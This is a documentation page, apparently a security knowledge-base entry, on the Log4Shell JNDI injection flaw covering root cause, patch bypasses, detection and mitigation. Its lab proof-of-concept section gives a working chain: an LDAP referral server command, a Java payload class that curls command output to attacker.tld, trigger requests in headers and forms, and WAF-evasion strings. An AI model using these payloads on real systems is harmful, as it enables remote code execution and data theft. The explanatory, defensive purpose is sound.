@@ -1,0 +1,146 @@
+---
+title: "Log4Shell (CVE-2021-44228)"
+sidebarTitle: "Log4Shell deep dive"
+description: "JNDI injection, the LDAP-to-RCE gadget chain, and why perimeter WAFs missed it."
+tag: "CRITICAL"
+---
+
+<Warning>
+  **CVSS 10.0**  ·  **Affected:** log4j-core 2.0-beta9 through 2.14.1  ·  **Fixed:** 2.17.1
+</Warning>
+
+## Executive summary
+
+Any log statement that includes attacker-controlled input can trigger a JNDI lookup, causing the JVM to fetch and execute a remote class. One string, unauthenticated, pre-auth in most apps.
+
+```text
+${jndi:ldap://attacker.com/a}
+```
+
+## Root cause
+
+log4j's `MessageLookup` recursively expands `${...}` expressions in log messages. The `jndi:` prefix routes the lookup through `javax.naming.InitialContext`, which happily follows LDAP or RMI references and deserializes the returned object.
+
+<AccordionGroup>
+  <Accordion title="Vulnerable call path">
+    ```text
+    Logger.info(userInput)
+      -> MessagePatternConverter.format()
+        -> StrSubstitutor.substitute()
+          -> JndiLookup.lookup()
+            -> InitialContext.lookup("ldap://attacker/a")
+              -> class fetched, deserialized, executed
+    ```
+  </Accordion>
+
+  <Accordion title="Why 2.15 wasn't enough">
+    The 2.15 patch restricted JNDI to `java` protocol and localhost, but `${jndi:ldap://127.0.0.1#evil.com/a}` and Thread Context Map bypasses (CVE-2021-45046) reopened the door. 2.16 removed the lookup entirely. 2.17 fixed a DoS. 2.17.1 fixed one more JDBC path.
+  </Accordion>
+</AccordionGroup>
+
+## Building a PoC
+
+<Warning>
+  Lab-only. Do this on an isolated VM you own.
+</Warning>
+
+### 1. Attacker LDAP referral server
+
+```bash marshalsec
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
+  marshalsec.jndi.LDAPRefServer \
+  "http://attacker.tld:8000/#Exploit"
+```
+
+### 2. HTTP host serving the payload class
+
+```java Exploit.java
+public class Exploit {
+    static {
+        try {
+            Runtime.getRuntime().exec(new String[]{
+                "/bin/sh", "-c",
+                "curl attacker.tld:9001 -d $(id | base64)"
+            });
+        } catch (Exception e) {}
+    }
+}
+```
+
+```bash Compile + serve
+javac Exploit.java
+python3 -m http.server 8000
+```
+
+### 3. Trigger
+
+Anywhere the target logs user input works. Common sinks:
+
+<Tabs>
+  <Tab title="HTTP header">
+    ```http
+    GET / HTTP/1.1
+    Host: target
+    User-Agent: ${jndi:ldap://attacker.tld:1389/Exploit}
+    X-Api-Version: ${jndi:ldap://attacker.tld:1389/Exploit}
+    ```
+  </Tab>
+  <Tab title="Auth form">
+    ```http
+    POST /login HTTP/1.1
+    Host: target
+    Content-Type: application/x-www-form-urlencoded
+    
+    username=${jndi:ldap://attacker.tld:1389/x}&password=x
+    ```
+  </Tab>
+  <Tab title="URL param">
+    ```text
+    GET /?q=${jndi:ldap://attacker.tld:1389/x}
+    ```
+  </Tab>
+</Tabs>
+
+## Why signature-based WAFs failed
+
+log4j supports nested lookups, so attackers used them for evasion:
+
+```text
+${${lower:j}${lower:n}di:ldap://...}
+${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://...}
+${${::-j}${::-n}${::-d}${::-i}:ldap://...}
+```
+
+Every `${` expansion is legal syntax. A regex chasing `jndi:` misses all of the above.
+
+## Detection
+
+<CardGroup cols={2}>
+  <Card title="Sigma" icon="eye">
+    Alert on `\${jndi:` (and hex/unicode variants) in any web log field.
+  </Card>
+
+  <Card title="Runtime" icon="shield">
+    Hook `InitialContext.lookup` in-JVM. Falco / OSQuery for outbound LDAP from JVM PIDs.
+  </Card>
+
+  <Card title="Network" icon="network-wired">
+    JVMs suddenly talking LDAP/RMI outbound is almost always bad.
+  </Card>
+
+  <Card title="IOC hunt" icon="magnifying-glass">
+    `grep -rE '\\$\\{jndi:' /var/log`. Yes, really.
+  </Card>
+</CardGroup>
+
+## Mitigation checklist
+
+- [ ] Upgrade `log4j-core` to 2.17.1\+ (Java 8) or 2.12.4 (Java 7).
+- [ ] If you cannot upgrade: remove `JndiLookup.class` from the jar.
+- [ ] Egress-filter outbound LDAP/RMI/DNS from application tiers.
+- [ ] Deploy a JVM agent (`hotpatch`) on legacy hosts you can't restart.
+
+## References
+
+- Apache advisory: [log4j-2021-44228](https://logging.apache.org/log4j/2.x/security.html)
+- Original PoC thread: LunaSec disclosure
